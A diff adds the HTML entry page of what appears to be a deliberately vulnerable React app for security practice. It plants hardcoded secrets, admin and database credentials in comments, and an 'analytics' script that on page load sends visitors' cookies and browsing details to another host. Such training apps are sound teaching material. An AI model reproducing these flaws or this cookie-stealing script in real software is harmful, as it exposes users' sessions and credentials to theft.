@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>React Vulnerable App</title>
+    <script src="%PUBLIC_URL%/config.js"></script>
+    <script>
+      // TODO: remove this debug code before production
+      var DEBUG_MODE = true;
+      var API_SECRET = "sk" + "_live_" + "XxXXxXxXXxXxXXxXxX";
+      console.log("App initialized in debug mode");
+    </script>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+    <!-- Dev note: admin login at /admin, password is REPLACE_ME_ADMIN_PASS -->
+    <!-- Database: mysql://root:pass --><!-- word@localhost:3306/users -->
+    <script>
+      // Track all users for analytics
+      function trackUser() {
+        var data = {
+          url: window.location.href,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent,
+          cookies: document.cookie
+        };
+        fetch("http://192.168.1.100:3001/track", {
+          method: "POST",
+          body: JSON.stringify(data)
+        });
+      }
+      trackUser();
+    </script>
+  </body>
+</html>
